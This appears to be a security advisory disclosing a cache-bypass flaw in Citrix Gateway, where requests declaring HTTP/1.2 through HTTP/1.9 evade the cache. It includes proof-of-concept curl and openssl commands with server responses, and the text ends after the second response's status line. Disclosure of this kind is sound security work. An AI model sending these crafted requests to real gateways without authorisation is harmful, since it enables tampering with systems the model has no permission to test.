~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

"Citrix Gateway is a customer-managed solution that can be deployed on
premises or on any public cloud, such as AWS, Azure, or Google Cloud
Platform.  Citrix Gateway provides users with secure access and single
sign-on to all the virtual, SaaS and web applications they need to be
productive." (see [1])

The solution contains a caching system, which stores content for a
static period of time.  With a simple attack the cache can be
bypassed.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

Requests with the invalid and not specified protocols declared as
HTTP/1.2 up to HTTP/1.9 can be used to bypass the caching system.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

As described in the security advisory SYSS-2020-005, the cache can be
poisoned. The value in the cache was poisoned with the value 42. But
this request should be answered with the value 23.

$ curl --include --url https://$NSGATEWAYHOST/logon/incremental.php --data "value=22"
HTTP/1.1 200 OK
Age: 5         
Date: Fri, 31 Jan 2020 12:26:03 GMT
Expires: Thu, 01 Jan 1970 00:00:01 GMT
Cache-Control: no-store, must-revalidate
Connection: Keep-Alive
Via: NS-CACHE-10.0: 121
ETag: "KXGGENKFDKOU"
Server: Apache
X-Frame-Options: SAMEORIGIN
Pragma: no-cache
Content-Length: 3
Content-Type: text/html; charset=UTF-8

42


Using HTTP/1.2 in the request, the cache can be bypassed and in the
PoC request the value will be processed correctly.

$ VALUE=22; echo -e "POST /logon/incremental.php HTTP/1.2\nHost: $NSGATEWAYHOST\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: $[${#VALUE}+6]\n\nvalue=$VALUE"|openssl s_client -connect $NSGATEWAYHOST:https -quiet
depth=2 C = US, ST = New Jersey, L = Jersey City, O = The USERTRUST Network, CN = USERTrust RSA Certification Authority
verify return:1
depth=1 C = GB, ST = Greater Manchester, L = Salford, O = Sectigo Limited, CN = Sectigo RSA Domain Validation Secure Server CA
verify return:1
depth=0 CN = $NSGATEWAYHOST
verify return:1
HTTP/1.1 200 OK
